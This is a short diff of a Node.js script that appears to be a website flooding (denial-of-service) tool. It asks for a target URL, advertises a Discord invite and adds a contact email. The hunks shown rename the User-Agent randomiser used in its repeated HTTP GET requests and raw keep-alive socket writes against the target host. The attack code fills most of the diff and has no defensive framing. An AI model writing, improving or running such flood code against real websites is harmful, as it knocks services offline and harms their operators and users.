@@ -9,6 +9,10 @@ const rl = readline.createInterface({
     output: process.stdout
 });
 
+/*
+Any bug/error? Contact sunshinexjuhari@protonmail.com
+*/
+
 console.log("discord >> https://discord.gg/JD9K97MJKx");
 console.log("");
 console.log("[?] Put (https://) or (http://) first.");
@@ -91,7 +95,7 @@ rl.question('url website > ', async (url) => {
                             path: new URL(targetUrl).pathname,
                             method: 'GET',
                             headers: {
-                                'User-Agent': getRandomUserAgent(),
+                                'User-Agent': getagent(),
                             }
                         };
 
@@ -132,7 +136,7 @@ rl.question('url website > ', async (url) => {
 
                     socket.on('connect', () => {
                         socket.write(`GET / HTTP/1.1\r\nHost: ${targetHostname}\r\n`);
-                        socket.write(`User-Agent: ${getRandomUserAgent()}\r\n`);
+                        socket.write(`User-Agent: ${getagent()}\r\n`);
                         socket.write(`Keep-Alive: timeout=1, max=1000\r\n`);
                         socket.write('\r\n');
                     });
@@ -164,7 +168,7 @@ rl.question('url website > ', async (url) => {
                             path: new URL(targetUrl).pathname,
                             method: 'GET',
                             headers: {
-                                'User-Agent': getRandomUserAgent(),
+                                'User-Agent': getagent(),
                             }
                         };
 
